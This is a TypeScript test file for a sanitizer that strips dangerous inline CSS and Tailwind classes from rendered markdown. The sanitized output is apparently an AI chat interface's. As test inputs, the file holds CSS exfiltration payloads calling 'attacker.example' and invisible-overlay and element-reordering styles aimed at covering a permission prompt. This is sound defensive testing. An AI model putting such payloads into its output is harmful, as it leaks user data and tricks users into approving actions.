import { describe, expect, it } from 'vitest'
import { filterInlineStyle, filterClassName, rehypeSanitizeInlineStyle } from './style-sanitizer.ts'

describe('filterInlineStyle — blocks CSS exfil and UI redress', () => {
  it('drops CSS that exfiltrates data via background-image:url(...)', () => {
    // Silent data exfil: the browser auto-fetches the attacker URL (Referer
    // leak). Must be fully stripped regardless of which property carries it.
    expect(filterInlineStyle('background-image:url(https://attacker.example/exfil?d=leaked)')).toBeUndefined()
    expect(filterInlineStyle('background:url(https://attacker.example/x)')).toBeUndefined()
    expect(filterInlineStyle('--x:url(https://attacker.example/x)')).toBeUndefined()
  })

  it('neutralizes UI redressing by dropping position/z-index/opacity/top/left/width', () => {
    // An invisible full-screen overlay over the Ask permission prompt needs
    // position:fixed (dropped) plus top/left/width/z-index/opacity (dropped).
    // height may survive (KaTeX struts need it), but without position it cannot
    // overlay the viewport — the redress is neutralized.
    const filtered = filterInlineStyle(
      'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;opacity:0',
    )
    // height survives (harmless without position); every redress-enabling prop is gone.
    expect(filtered).toBe('height: 100%')
    for (const dangerous of ['position', 'top', 'left', 'width', 'z-index', 'opacity']) {
      expect(filtered).not.toContain(dangerous)
    }
  })

  it('keeps KaTeX strut layout properties so KaTeX renders correctly', () => {
    expect(filterInlineStyle('height:2.7em;vertical-align:-0.954em')).toBe(
      'height: 2.7em; vertical-align: -0.954em',
    )
    expect(filterInlineStyle('text-align:center')).toBe('text-align: center')
    expect(filterInlineStyle('margin-top:0.5em;padding:2px')).toBe('margin-top: 0.5em; padding: 2px')
  })

  it('keeps safe properties and strips dangerous ones in a mixed declaration', () => {
    expect(
      filterInlineStyle('height:1em;position:fixed;opacity:0;background-image:url(https://evil/x)'),
    ).toBe('height: 1em')
  })

  it('handles a hast-style style object (property map)', () => {
    expect(
      filterInlineStyle({ height: '1em', backgroundImage: 'url(https://evil/x)' }),
    ).toBe('height: 1em')
    expect(filterInlineStyle({ position: 'fixed', opacity: '0' })).toBeUndefined()
  })

  it('returns undefined for empty / non-style input', () => {
    expect(filterInlineStyle('')).toBeUndefined()
    expect(filterInlineStyle(undefined)).toBeUndefined()
    expect(filterInlineStyle(null)).toBeUndefined()
    expect(filterInlineStyle(42 as unknown)).toBeUndefined()
  })
})

describe('filterClassName — strips Tailwind UI-redress tokens', () => {
  it('strips Tailwind UI-redress tokens (position/inset/opacity/pointer-events/z-index)', () => {
    // A prompt-injected invisible overlay: fixed inset-0 opacity-0 pointer-events-none z-[9999].
    const filtered = filterClassName('fixed inset-0 opacity-0 pointer-events-none z-[9999]')
    expect(filtered).toBeUndefined()
  })

  it('strips offset / transform tokens too', () => {
    expect(filterClassName('absolute top-10 left-5 translate-x-4 rotate-45')).toBeUndefined()
  })

  it('preserves KaTeX / GFM class names', () => {
    expect(filterClassName('katex')).toBe('katex')
    expect(filterClassName('katex-display strut mord mfrac')).toBe('katex-display strut mord mfrac')
    expect(filterClassName('contains-task-list task-list-item')).toBe('contains-task-list task-list-item')
    expect(filterClassName('language-python')).toBe('language-python')
  })

  it('keeps safe classes while dropping dangerous ones in a mixed set', () => {
    expect(filterClassName('katex fixed opacity-0 mord')).toBe('katex mord')
  })

  it('handles array className and undefined/empty input', () => {
    expect(filterClassName(['katex', 'fixed', 'opacity-0'])).toEqual(['katex'])
    expect(filterClassName('')).toBeUndefined()
    expect(filterClassName(undefined)).toBeUndefined()
    expect(filterClassName(null)).toBeUndefined()
  })

  it('strips arbitrary-value transforms (transform-[...]) — not just translate/rotate/scale', () => {
    // Tailwind v3 compiles transform-[translateX(100px)] → transform: translateX(...),
    // which works on ANY element (no `position` class needed). The token starts with
    // `transform-`, which the pre-fix regex did not match (diverges from `translate`).
    expect(filterClassName('transform-[translateX(-100px)]')).toBeUndefined()
    expect(filterClassName('transform-[scale(1.5)]')).toBeUndefined()
    expect(filterClassName('transform-gpu')).toBeUndefined()
    // bare `transform` is a no-op without a translate/rotate/scale — keep it
    expect(filterClassName('transform')).toBe('transform')
  })

  it('strips NEGATIVE variants (-translate-x-4, -top-10, -z-50)', () => {
    // Tailwind negative variants start with `-`; the anchored ^ regex would let
    // them through. -translate-x-4 → transform: translateX(-1rem) shifts an
    // element to overlay an adjacent UI target with no position class needed.
    expect(filterClassName('-translate-x-4')).toBeUndefined()
    expect(filterClassName('-top-10 -left-5 -inset-y-1 -z-50')).toBeUndefined()
  })

  it('strips the pointer-events alias pe-none (but NOT pe-<n> padding-inline-end)', () => {
    expect(filterClassName('pe-none')).toBeUndefined()
    expect(filterClassName('pe-auto')).toBeUndefined()
    // pe-<n> is padding-inline-end (benign) — the precise PE_ALIAS_RE keeps it.
    expect(filterClassName('pe-4')).toBe('pe-4')
    expect(filterClassName('pe-px')).toBe('pe-px')
  })

  it('strips visual-reordering tokens (order-*, flex-*-reverse)', () => {
    // order-first reorders a flex child to slot 1; flex-row-reverse reverses all
    // children — a fake button injected with either visually swaps into a real
    // button's position (UI redress via reordering, not just overlay).
    expect(filterClassName('order-first')).toBeUndefined()
    expect(filterClassName('order-last order-2')).toBeUndefined()
    expect(filterClassName('flex-row-reverse')).toBeUndefined()
    expect(filterClassName('flex-col-reverse')).toBeUndefined()
    // flex-<n> (grow/basis) is benign — the precise FLEX_REVERSE_RE keeps it.
    expect(filterClassName('flex-1')).toBe('flex-1')
    expect(filterClassName('flex-grow')).toBe('flex-grow')
  })
})

describe('rehypeSanitizeInlineStyle — tree walk', () => {
  it('strips dangerous style + className and keeps safe ones across the tree', () => {
    const tree = {
      type: 'root',
      children: [
        {
          type: 'element',
          tagName: 'div',
          properties: {
            style: 'background-image:url(https://evil/x)',
            className: 'fixed inset-0 opacity-0 z-[9999] katex',
          },
          children: [
            {
              type: 'element',
              tagName: 'span',
              properties: { style: 'height:1em;vertical-align:top', className: 'strut mord' },
              children: [],
            },
          ],
        },
      ],
    }
    const result = rehypeSanitizeInlineStyle()(tree)
    const div = (result as { children: { properties: Record<string, unknown> }[] }).children[0]
    expect(div.properties).not.toHaveProperty('style')
    expect(div.properties.className).toBe('katex')
    const span = (div as unknown as { children: { properties: Record<string, unknown> }[] }).children[0]
    expect(span.properties.style).toBe('height: 1em; vertical-align: top')
    expect(span.properties.className).toBe('strut mord')
  })
})
